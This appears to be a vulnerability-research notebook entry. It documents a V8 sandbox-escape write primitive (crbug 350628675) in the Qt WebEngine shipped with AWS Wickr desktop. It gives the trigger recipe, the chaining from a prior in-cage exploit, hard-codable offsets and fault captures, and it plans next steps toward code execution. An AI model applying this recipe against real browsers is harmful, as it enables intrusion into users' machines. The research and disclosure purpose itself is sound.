# W43 — A4 (crbug 350628675): unbounded `table_index` gives an OUT-OF-CAGE WRITE

Written 2026-08-05. Continues W42 (out-of-cage READ) and W35 (in-cage arb R/W).
Every line **[M] measured** on the shipped AWS Wickr desktop (Qt WebEngine 6.9.2, Chromium base
130.0.6723.192, declared security-patch level 139.0.7258.67) unless marked **[I] inferred** or
**[P] public source read in full**. Harness/pages `scratch/w43/`.

**Bottom line: an attacker page that already holds W35's in-cage arbitrary write points a
`WasmTableObject`'s `uses` list at a two-element JS array it built itself, whose second element
is an arbitrary `Smi`. `WebAssembly.Table.prototype.grow` then walks that list and uses the Smi
as `table_index` with no bounds check at all, driving two accesses OUTSIDE the 1 TiB V8
sandbox — and the second of them is a STORE.** Four things are demonstrated:

* **Stage 1 [M]** — the write leaves the cage. The faulting instruction is
  `mov [rdx], r8d` at `Qt6WebEngineCore+0x17e380d` with `RDX` equal, to the byte, to the
  out-of-cage address chosen via the Smi: `RDX == dispatch_tables_elements + 4*K`, **5 of 6
  runs** (the 6th never fired — §9), two K values of opposite sign, bases ASLR-randomised per run.
* **Stage 2a [M]** — the write is real. With the same target page mapped read-write, the 4 bytes
  at that address change from the planted value to a fresh trusted-space pointer, the ±4/±8
  canaries are untouched, and **the renderer survives** (`grow()` returns normally).
* **Stage 2b [M]** — the write is aimed and byte-exact. Through a forged `WasmDispatchTable` the
  page writes a **random 32-bit nonce** to an **address the OS confirmed FREE before the harness
  reserved it**, outside the sandbox reservation. Read back independently: **5/6 runs
  byte-exact**, guards intact, renderer survives every time.
* **Stage 2c [M]** — with **no harness plant of any kind**, a plain `table_index` of 263 makes
  the page's own `grow()` write 4 bytes into a *different live trusted-space object* (a second
  `WebAssembly.Instance`'s dispatch-table array), and 263 is a **layout constant, identical
  across runs** — so no leak is needed to compute it.

Paired with W42 this gives **out-of-cage read and write, i.e. a V8 sandbox escape**. It is
**not code execution** (§8) and does not reach `WickrPro.exe` — the renderer is still inside the
OS sandbox (IL=UNTRUSTED / restricted / job, W18).

---

## 1. The defect, confirmed against the pinned tree [P]
`src/wasm/wasm-objects.cc` at `v8 branch-heads/13.0` (fetched to
`scratch/w43/src/v8/branch-heads_13.0/`). `WasmTableObject::uses` is an **in-cage** `FixedArray`
of `<WasmInstanceObject, Smi>` pairs (`wasm-objects.tq:188-190`). `WasmTableObject::Grow`:

```cpp
DirectHandle<FixedArray> uses(table->uses(), isolate);
DCHECK_EQ(0, uses->length() % TableUses::kNumElements);        // DCHECK -> absent in release
for (int i = 0; i < uses->length(); i += TableUses::kNumElements) {
  int table_index = Cast<Smi>(uses->get(i + TableUses::kIndexOffset)).value();   // UNBOUNDED
  ...
  bool is_shared =
      non_shared_trusted_instance_data->module()->tables[table_index].shared;    // OOB READ #1
  DCHECK_EQ(old_size, trusted_instance_data->dispatch_table(table_index)->length());
  WasmTrustedInstanceData::EnsureMinimumDispatchTableSize(
      isolate, trusted_instance_data, table_index, new_size);
}
```
and (`wasm-objects.cc:1296-1313`)
```cpp
void WasmTrustedInstanceData::EnsureMinimumDispatchTableSize(..., int table_index, int minimum_size) {
  Handle<WasmDispatchTable> old_dispatch_table{
      trusted_instance_data->dispatch_table(table_index), isolate};              // OOB READ #2
  if (old_dispatch_table->length() >= minimum_size) return;
  DirectHandle<WasmDispatchTable> new_dispatch_table =
      WasmDispatchTable::Grow(isolate, old_dispatch_table, minimum_size);        // -> in-place int32 write
  if (*old_dispatch_table == *new_dispatch_table) return;
  trusted_instance_data->dispatch_tables()->set(table_index, *new_dispatch_table);  // OOB WRITE
  ...
}
```
Both destinations are **outside the sandbox**: `module()` is a `WasmModule*` on the C++ heap
whose `tables` is a plain `std::vector<WasmTable>` (`wasm-module.h:693`), and `dispatch_tables()`
is a `ProtectedFixedArray` in **trusted space**. `ProtectedArrayShape::kElementSize = kTaggedSize`
and `TaggedArrayBase::get/set` bound the index only with `DCHECK(IsInBounds(index))`
(`fixed-array-inl.h:93`), i.e. **not at all in release**. This is W36's G2 observation restated
from the source: every `SBXCHECK` on the path bounds `func_index`; none bounds `table_index`.
**`Grow` is the SBXCHECK-free route** — the sibling `Set` path does carry
`SBXCHECK(FunctionSigMatchesTable(...))`, which is why the trigger grows rather than sets.

**Fix `74caf5449508` (2024-12-02), "[wasm][sandbox] One WasmDispatchTable per WasmTableObject",
`Fixed: 350628675, 42204123`** — read in full [P]. Its `wasm-objects.tq` hunk is exactly:
```diff
-  // The uses field stores an array of <WasmInstanceObject, index> pairs so we
-  // can update the instance's dispatch table when the table grows.
-  uses: FixedArray;
   raw_type: Smi;
+  // This field is not set if the table is not a function table.
+  trusted_dispatch_table: TrustedPointer<WasmDispatchTable>;
```
i.e. the in-cage `uses` list is **deleted**; the replacement `WasmDispatchTable::protected_uses`
is a `ProtectedWeakFixedArray` **in trusted space**, out of reach of an in-cage write, and
`WasmTableObject::AddUse` plus the whole `module_->tables[table_index]` instantiation loop go
away with it. That is the root cause fixed at the source: *no in-cage value indexes an
out-of-cage structure any more.* It carries **no CVE**, and Qt's backport ledger is CVE-keyed
(W36), so it is structurally likely to be missing — and §2 shows it *is* missing, measured
behaviourally on the shipped build rather than inferred from a version number.
The fix commit is saved at `scratch/w43/commit_74caf5449508.txt`; no PoC was downloaded or run.

## 2. The pre-fix object graph is what this build compiled — byte-exact [M]
`scratch/w43/w43-p1-layout.html`, one run, `LAYOUT-CONFIRMED`. The page instantiates a module
that imports a funcref table, then reads the live `WasmTableObject` with W35's `arbRead64`:

```
aTbl 0x1039845  entries 0x1039821  curLen 0xe (=Smi 7, the imported table's initial size)
maxLen 0x1212000 (=Smi 0x909000, the declared maximum)  uses 0x103ce8d  rawType 0x3d09016
uses.map 0x5bd   uses.length 0x4 (=Smi 2)   uses[0] 0x5720701   uses[1] 0x0 (=Smi 0)
addrof(instance)                            = 0x5720701      <-- identical
```
`uses` is a live `FixedArray` at `WasmTableObject+24` holding exactly
`{&WasmInstanceObject, Smi(table_index=0)}` — the structure `WasmTableObject::AddUse` builds and
the fix deletes. **A/B: patched Chrome 150 → `NO-SMASH`** (the CVE-2026-11645 bootstrap is fixed
there, so the chain never starts; and per [P] its V8 has no `uses` field at all).

## 3. The trigger (`scratch/w43/w43-p2-fire.tmpl.html`) [M]
1. W35 bootstrap (CVE-2026-11645) → `arbRead64` / `arbWrite64` / `addrof`.
2. Build one module declaring **33 tables**: table 0 is the imported funcref table (so
   `AddUse` runs — it is only called for funcref-subtype tables); tables 1..32 are defined,
   funcref or externref per a 32-bit `PATTERN`, each with `maximum = 0x909000 + i`. Those two
   choices exist purely so the harness can *find and measure* the out-of-cage structures (§5).
   Table 1 is externref and is exported as `x`.
3. **The forged uses list is an ordinary JS array**: `const fakeUses = [winst, 0]` is
   `PACKED_ELEMENTS`, so its backing store is a `FixedArray` of length 2 holding exactly
   `{&WasmInstanceObject, Smi}` — bit-for-bit the shape `AddUse` builds. The index is then set
   with a plain-JS `fakeUses[1] = K`. So the exploit needs **one** 8-byte arbitrary write, not a
   read-modify-write of a live V8 array.
4. That one write retargets the **externref** table's `uses` field (`WasmTableObject+24`) at the
   forged backing store. Growing an externref table walks `uses` exactly like a funcref table,
   but fills the new entries through `WasmTableObject::Set`'s externref fast path
   (`entries->set` only), so nothing downstream re-enters the dispatch tables.
5. `wext.grow(N)` fires it.

Two measured reliability facts, both of which cost a debugging cycle and are now encoded in the
page: W35's `arbRead64` returns `bitsOf(...)`, **an array literal — it allocates**, so a scavenge
lands inside the address-taking burst; the allocation-free `rd()`/`wr()` variants fix that. And
the retarget write carries **no write barrier**, so the groom is done *after* the wasm graph
exists in order to promote `winst`/the tables/`fakeUses` into old space.

## 4. Stage 1 — the WRITE leaves the cage. A/B divergence table [M]
Shipped Qt rows are `w43run.py … mode 2`, which maps the target page **PAGE_READONLY** so the
out-of-cage store faults and the VEH dumper can name the operation and the address.

| # | port | `table_index` K | `dispatch_tables` elements (trusted space, ASLR per run) | fault @ | operation | target address | `target − dt_elems` |
|---|---|---|---|---|---|---|---|
| ctl | 8631 | 0 (in bounds) | — | — | none — page reports `GREW`, renderer alive | — | — |
| 1 | 8661 | **−134217728** | `0x604a00043554` | `+0x17e380d` | **WRITE** | `0x6049e0043554` | `0xffffffffe0000000` = 4K ✔ |
| 2 | 8703 | +268369920 | `0x724400043294` | `+0x17e380d` | **WRITE** | `0x724440003294` | `0x3ffc0000` = 4K ✔ |
| 3 | 8706 | +268369920 | `0x1f00043298` | `+0x17e380d` | **WRITE** | `0x1f40003298` | `0x3ffc0000` = 4K ✔ |
| 4 | 8709 | +268369920 | `0x1b24000434e4` | `+0x17e380d` | **WRITE** | `0x1b24400034e4` | `0x3ffc0000` = 4K ✔ |
| 5 | 8712 | +268369920 | `0x4691000434e4` | `+0x17e380d` | **WRITE** | `0x4691400034e4` | `0x3ffc0000` = 4K ✔ |
| 6 | 8715 | +268369920 | `0x1a4a00043298` | `+0x17e380d` | **WRITE** | `0x1a4a40003298` | `0x3ffc0000` = 4K ✔ |

Two K values of opposite sign, six shipped-Qt runs, six different ASLR bases, one identity:
`fault_target == dispatch_tables_elements + 4*K`, exact every time. `+0x17e380d` is
`Qt6WebEngineCore.dll+0x17e380d`.

A representative capture (port 8661):
```
### FAULT #1 code=0xc0000005 at Qt6WebEngineCore.dll+0x17e380d
    operation = WRITE   target address = 0x6049e0043554
    target - dt_elems  = 0xffffffffe0000000   ( K*4 = 0xffffffffe0000000 )
    RIP bytes: 44 89 02 41 f6 c0 01 74 0b     ; mov [rdx],r8d / test r8b,1 / je ...
    RDX = 0x6049e0043554     ; the store's destination == the address we chose
    R8  = 0x604a000453f1     ; the value: the new WasmDispatchTable, trusted-space-compressed
    R12 = 0xffffffffe0000008 ; (int32)(kHeaderSize + K*kTaggedSize) = 8 + 4K, sign-extended
    R13 = 0x00000000f8000000 ; = (int32)K, the untagged index (0xf8000000 == -134217728)
    V8 sandbox reservation for this run: 0x28400000000 .. 0x37effff0000  (0.980 TiB)
    trusted-space base 0x604a00000000  -- outside it; target page was MEM_FREE before we reserved it
```
The full byte sequence is `44 89 02 | 41 f6 c0 01 | 74 0b | 41 b9 03 00 00 00 | e8 …` =
*store the 4-byte value, test its Smi bit, and on a heap pointer call the write barrier with
`r9d = 3`* — the shape of `ProtectedFixedArray::set(index, value)` with
`ConditionalWriteBarrier` [M for the bytes and the operand values, [I] for the symbol name: this
build has no symbols, so the identification rests on the instruction shape plus the exact
`dt_elems + 4K` address identity]. The earlier access on the same path is also captured —
`cmp byte [rax+rcx+0Eh], 0` at `Qt6WebEngineCore+0x17e61ec` with `RAX = tables.data()`,
`RCX = K*32`, i.e. `module->tables[K].shared` with `offsetof(WasmTable, shared) == 14`, matching
`wasm-module.h:633-643` field for field.

**On the A/B:** Chrome 150's `NO-SMASH` is emitted at the CVE-2026-11645 fire, before any
`table_index` is used, so it is K-independent — the patched build blocks the chain at the
bootstrap and A4 never runs there (identical situation to W42 §5). Measured on the identical
page bytes (`ab43.py … chrome`, §4b). The A4 arithmetic is therefore isolated **on shipped Qt**,
by the in-bounds (`K=0` → `GREW`, renderer survives) vs out-of-bounds divergence above.

### 4b. The paired A/B, identical page bytes [M] (`ab43.py w43-ab-fire.html both`,
`w43-ab-fire.html.ab.json`) — self-contained page, `K = 0x3FFFFFFF` compiled in, no harness:

| side | beacons |
|---|---|
| **shipped Qt WebEngine** | `ENTER` → `HOLES` → `LEAK consistent:true` → `WASM ok:true` → `PRE … okBase:true` → `FORGED forgeOK:true rawK:0x7ffffffe` → `PRE-GROW` → **renderer terminated** (no `GROW` beacon) |
| **patched Chrome 150** | `ENTER` → `HOLES` → `DONE NO-SMASH` |

## 5. How the harness aims the index, and what it proves [M]
`scratch/w43/w43fault.c` runs the page in a `--single-process` Qt WebEngine, so the renderer's
memory is the harness's memory. It **finds and measures** both out-of-cage structures rather
than assuming their layout:

* `WasmModule::tables` — scan for the `maximum_size` arithmetic sequence `0x909000+i`; the
  matching **stride is `sizeof(WasmTable)`, measured = 32**, and the base is `tables.data()`.
  The full 33-entry sequence is required: `std::vector` reallocates while the module decodes and
  the freed shorter buffers keep their bytes, so a prefix match picks a stale copy (measured —
  the live `tables.data()` in `RAX` was ~26 MB from the first prefix hit).
* `dispatch_tables` — scan trusted space for the capacity word `Smi(33)` followed by 33 4-byte
  elements whose zero / non-zero pattern equals the module's externref / funcref `PATTERN`.
  Elements start 4 bytes after the capacity word, confirming `kHeaderSize = 8` — independently
  corroborated by `R12 = 8 + 4K` at the fault.
* the trusted-space compression base and `kLengthOffset` are then derived from the *real*
  dispatch table of table 0 and validated by finding `length == 7` (the imported table's initial
  size): measured `kLengthOffset = 4`.
* the V8 sandbox reservation is located as the single ≥512 GiB reservation (measured
  0.969–0.980 TiB across runs).

It then picks K so that **both** derived addresses lie on memory `VirtualQuery` reports
`MEM_FREE`, reserves them, plants, and hands K to the page over `/params`. Mapping the read-side
page is only a survivability precondition (the OOB read of `tables[K].shared` must not fault and
must read 0); the claim is about the write.

## 6. Stage 2 — the write is real, aimed, and byte-exact [M]

### 6a. `dispatch_tables()->set(K, …)` — address chosen by the page, value chosen by V8
Mode 1 plants the real dispatch-table pointer at `dt_elems + 4K` so the OOB read yields a
well-formed table, and grows past its capacity so `WasmDispatchTable::Grow` reallocates. Port
8651:
```
OOB WRITE dispatch_tables[K] @ 0x6439e00434e0 = dt_elems - 0x20000000   (K = -134217728)
   that target page was MEM_FREE before we reserved it, and outside [0xa400000000,0x19dffff0000)
planted 0x00043571  ->  now 0x0004537d      CHANGED == OUT-OF-CAGE WRITE EXECUTED
canaries: -8=c0deba5e  -4=c0deba5f  +4=c0deba60  +8=c0deba61      (all intact)
page: {"step":"GROW","ok":true,"ret":0,"extLen":64} -> DONE GREW ; harness faults=0
```
Exactly 4 bytes, exactly at the chosen address, and **the renderer survives** — this is a usable
primitive, not a controlled crash.

### 6b. `RELEASE_WRITE_INT32_FIELD` — address AND value chosen, random-nonce cross-check
`WasmDispatchTable::Grow` has an in-place branch:
```cpp
if (new_length < old_table->capacity()) {
  RELEASE_WRITE_INT32_FIELD(*old_table, kLengthOffset, new_length);   // 4-byte int32 store
  return old_table;                                                   // -> caller returns, no 2nd write
}
```
So a forged `WasmDispatchTable` with `length = 0` and `capacity > new_length` turns the primitive
into a single 4-byte store of `new_length` — a value the attacker picks — at
`fake_base + kLengthOffset`, anywhere the forged pointer can address. Mode 3 plants such a fake
at a trusted-space address the OS confirmed FREE, and the harness generates a **random nonce**
which becomes the grow count. Port 8671:
```
fake WasmDispatchTable at 0x185580000000 (compressed 0x80000001) planted at 0x1854e0043294
harness NONCE = 6165911 (0x005e1597)
GROUND-TRUTH: expect 0x185580000004 == 6165911 after the fire
V8 sandbox reservation this run: 0x19800000000 .. 0x291ffff0000     (0.977 TiB)

fake.length @ 0x185580000004 : planted 0 -> now 6165911   BYTE-EXACT MATCH == aimed out-of-cage WRITE
fake guards: -4=feedface  capacity=6165927  +8=feedfad0            (intact)
dispatch_tables[K] @ 0x1854e0043294 = 0x80000001 (planted 0x80000001, unchanged — in-place branch)
canaries: -8=c0deba5e -4=c0deba5f +4=c0deba60 +8=c0deba61          (intact)
page: {"step":"GROW","ok":true,"ret":0,"extLen":6165911} -> DONE GREW ; harness faults=0
```
The target sits at `trusted_base + 2 GiB` (`0x185500000000 + 0x80000000`), **below the sandbox
reservation and outside it**, on a page `VirtualQuery` reported `MEM_FREE` and `VirtualAlloc`
then reserved — the same out-of-reservation proof W42 used for the read.

**Repeats — 5 of 6, each a fresh random nonce at a fresh ASLR-randomised address** (`batch.py 3`):

| port | K | write address (out of cage) | harness nonce | page wrote | |
|---|---|---|---|---|---|
| 8800 | +268369920 | `0x447a80000004` | 2435537 | 2435537 | **BYTE-EXACT** |
| 8803 | +268369920 | `0x6cb880000004` | 8724202 | 8724202 | **BYTE-EXACT** |
| 8806 | +268304384 | `0x616280000004` | 6788680 | 6788680 | **BYTE-EXACT** |
| 8809 | — | — | — | — | miss: the page's W35 phase-A leak failed, nothing fired |
| 8812 | +268369920 | `0x150080000004` | 6020287 | 6020287 | **BYTE-EXACT** |
| 8815 | +268369920 | `0x187e80000004` | 7387313 | 7387313 | **BYTE-EXACT** |

Every run's guards (`0xfeedface` / `0xfeedfad0`) and canaries were intact; the renderer survived
every one. No run wrote a wrong value or to a wrong address.

### 6c. No harness plant at all — the write with the page acting alone [M]
Modes 1–3 hand the page an index and pre-arrange what it finds there. Mode 4 removes all of
that. The page simply builds a **second `WebAssembly.Instance` of the same module**, so trusted
space holds a second `dispatch_tables` array whose element 0 is already a live
`WasmDispatchTable`. The harness reserves nothing, plants nothing, protects nothing — it only
measures the array-to-array distance and then watches. Port 8921:
```
dispatch_tables candidate #0 @ 0x79e400042f24
dispatch_tables candidate #1 @ 0x79e400043340
mode 4 (NO PLANT): dt[1] - dt[0] = 1052 bytes  =>  table_index K = 263
OOB READ  module->tables[K] @ 0x80033ed100 (8416 bytes past tables.data(); NOT mapped by us)
OOB WRITE target 0x79e400043340 == the SECOND instance's dispatch_tables[0], holding 0x000433d1

[!] LIVE OBSERVATION at t=500ms: 0x79e400043340 changed 0x000433d1 -> 0x0004520d
      words changed in the 64-byte window around the target: 1
```
A `table_index` of **263** — an ordinary small Smi, no leak, no plant — makes the page's own
`grow()` write 4 bytes into a *different* live trusted-space object, out of the cage. And the
1052-byte distance was **identical across runs**, i.e. it is a layout constant an attacker can
hard-code rather than something that has to be leaked (measured, §9).

**What the harness supplied, stated plainly.** Mode 3's *value* is genuinely attacker-chosen (the
page passes it as the grow count), but its *address* comes from a 4-byte pointer the harness
planted into the out-of-bounds trusted-space slot; a page-only attacker would have to get a
controlled word there by other means, and that was not demonstrated. Mode 1's *address* is chosen
by the page alone (`dt_elems + 4K`, K being the page's Smi) while the *value* is V8's, and the
harness still planted a valid dispatch-table pointer at the target. **Mode 4 needs none of that**
— but its destination is then whatever object happens to sit at `dt_elems + 4K`, not a free
choice. So: *aimed anywhere in a ±2 GiB window* and *fully value-controlled* have each been
demonstrated, but not simultaneously from a page with no harness assistance. That is the honest
boundary of this result.

## 7. The index arithmetic actually observed [M]
| | out-of-cage READ `module->tables[K]` | out-of-cage WRITE `dispatch_tables[K]` |
|---|---|---|
| base | `tables.data()` (C++ heap, e.g. `0xb4b6a4f270`) | `dispatch_tables` elements (trusted space, e.g. `0x604a00043554`) |
| element size | **32 = `sizeof(WasmTable)`, measured** from the max-size stride | **4 = `kTaggedSize`** (`ProtectedArrayShape::kElementSize`), corroborated by `R12 = 8 + 4K` |
| index width | **64-bit**: `RCX = 0x7ffffffe0` for K=`0x3fffffff`, `RCX = 0xffffffff00000000` for K=`-0x8000000` | **32-bit signed**: `OffsetOfElementAt` is `int` arithmetic — measured, K=`0x20000000` wrapped `RDX` to `0xffffffff80043290` |
| K range | `Smi` in a compressed cage ⇒ `[-2^30, 2^30-1]` | same |
| **reach** | **±32 GiB** around `tables.data()`, 32-byte granular | **±2 GiB** around `dispatch_tables`, **4-byte granular** |

So the destination is **freely chosen but quantised to 4 bytes and confined to a ±2 GiB window
around a trusted-space object** — not a full 64-bit arbitrary write. Escaping that window needs
the second hop (§6b), whose destination is limited instead to the 4 GiB trusted-space
compression cage. Both are outside the V8 sandbox; neither is unrestricted.

Coupling constraint worth recording: K fixes *both* addresses at once
(`tables.data() + 32K` and `dispatch_tables + 4K`), so the read must land on mapped memory whose
`.shared` byte is 0 for the write to be reached at all.

## 8. Verdict, and what the next stage must target [M]
* **Out-of-cage READ** — held (W42, byte-exact 5/5).
* **Out-of-cage WRITE** — held (this note: aimed, byte-exact, renderer survives).
* ⇒ **out-of-cage read *and* write, i.e. a V8 sandbox escape**, both halves demonstrated on the
  shipped build with A/B controls. Full chain: CVE-2026-11645 (in-cage arb R/W, W35) →
  crbug 519768343 (read, W42) + crbug 350628675 (write, W43).
* **NOT achieved: code execution.** No PC control, no ROP, no shellcode. The write is 4 bytes,
  quantised, and range-limited (§7).
* **The next wall is already measured: `QtWebEngineProcess.exe` has CFG ENABLED** (unlike
  `WickrPro.exe`, W17j). So a vtable/indirect-call hijack is the wrong plan. The next stage
  should target **JIT / W^X pages or a data-only route**. One lead is already visible from
  this note's own source reading, but is **[P]/[I], not measured**: a `WasmDispatchTable` entry
  is `{ Address target; protected implicit_arg; int32 sig }` (`wasm-objects.h:758-780`), i.e. the
  `target` is a **raw code address stored outside the cage**, and the whole entry array sits
  inside the ±2 GiB window this write reaches. Whether that is actually steerable was **not
  tested here and must not be claimed**.
* **This does not reach `WickrPro.exe`.** The renderer remains inside the OS sandbox
  (IL=UNTRUSTED / restricted / job, W18). A Chromium-sandbox escape would be a separate stage.

## 9. Reliability [M]
* Stage 1 (mode 2, WRITE fault): **5 of 6**. The miss (port 8700) never reached the fire — the
  harness scan found neither structure because the page's W35 phase-A leak had already failed,
  an ordinary `LEAK-FAIL`-class miss, not a contradicting result.
* Stage 2b (mode 3, byte-exact nonce): **5 of 6**, same failure mode for the miss (port 8809,
  `planted=0`, nothing fired).
* Stage 2c (mode 4, no plant): see the table below.

Every successful run matched `target == dt_elems + 4K` exactly. **No run ever wrote to an address
other than the predicted one, and no run ever produced a wrong value.** Failures are always the
inherited W35 bootstrap flakiness (~80% single-origin, W35 §9), never a mis-aimed write.

The mode-4 layout constant, across runs (this is what makes the index hard-codable):

| port | `dt[1] − dt[0]` | K | target | before → after | words changed in ±32 B |
|---|---|---|---|---|---|
| 8921 | 1052 B | 263 | `0x79e400043340` | `0x000433d1` → `0x0004520d` | 1 |
| 8930 | 1052 B | 263 | `0xf8e00043708` | `0x00043799` → `0x000455d5` | 1 |
| 8936 | 1052 B | 263 | `0x775a0004370c` | `0x0004379d` → `0x000455d9` | 1 |
| 8939 | 1052 B | 263 | `0x596300043958` | `0x000439e9` → `0x00045825` | 1 |
| 8911 | 1052 B | 263 | `0x73870004370c` | (predates the live watcher; not captured) | — |
| 8933 | — | — | — | miss: harness found no structures, nothing fired | — |

Same distance, same index, exactly one word changed — four separate runs, four different ASLR
bases. `dt[1] − dt[0] = 1052` was identical in all five runs that got that far.

## 10. Artifacts
`scratch/w43/`:
* `w43-p1-layout.html` (+ `.ab.json`) — the byte-exact `uses` layout proof of §2.
* `w43-p2-fire.tmpl.html` + `w43gen.py` — the parametric trigger; `w43-ab-fire.html` (+ `.ab.json`)
  is the self-contained A/B instance of §4b.
* `w43fault.c` / `w43fault.exe` — locate + plant + live-watch harness (modes 0–4).
* `w43run.py` (single run, fresh port each time), `batch.py` (+ `batch-m{2,3,4}.jsonl`),
  `ab43.py` (shipped Qt vs Chrome 150).
* 26 × `w43fault-<port>.log` (the fault captures and verifications quoted above),
  `w43params-<port>.json` (exactly what each run handed the page).
* `commit_74caf5449508.txt` / `.json` (the upstream fix), pinned V8 sources under
  `src/v8/branch-heads_13.0/` (`wasm-objects.{cc,h,tq}`, `wasm-objects-inl.h`, `wasm-module.h`,
  `wasm-limits.h`, `fixed-array.h`, `fixed-array-inl.h`, `trusted-object.h`,
  `module-instantiate.cc`), fetched with `srcget.py` / `cget.py`.

No third-party exploit code was downloaded or run — the trigger is self-written from the fix
commit and the pinned source. Only harness processes were started or stopped; the live product
was never touched. Everything is loopback, one fresh port per run.
